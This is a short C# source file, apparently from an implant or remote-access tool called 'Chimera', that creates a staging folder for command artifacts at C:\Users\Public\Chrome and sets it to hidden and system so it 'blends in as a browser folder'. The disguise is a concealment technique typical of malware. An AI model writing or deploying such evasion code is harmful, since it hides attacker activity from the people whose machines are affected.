using System;
using System.IO;

namespace Chimera
{
    // Central staging directory used by all commands that write artifacts to disk.
    // Hidden folder that blends in as a browser folder.
    public static class Staging
    {
        public const string Dir = @"C:\Users\Public\Chrome";

        public static void EnsureDir()
        {
            try
            {
                if (!Directory.Exists(Dir))
                {
                    Directory.CreateDirectory(Dir);
                    // Hide it
                    File.SetAttributes(Dir,
                        File.GetAttributes(Dir) | FileAttributes.Hidden | FileAttributes.System);
                }
            }
            catch { /* best-effort */ }
        }
    }
}
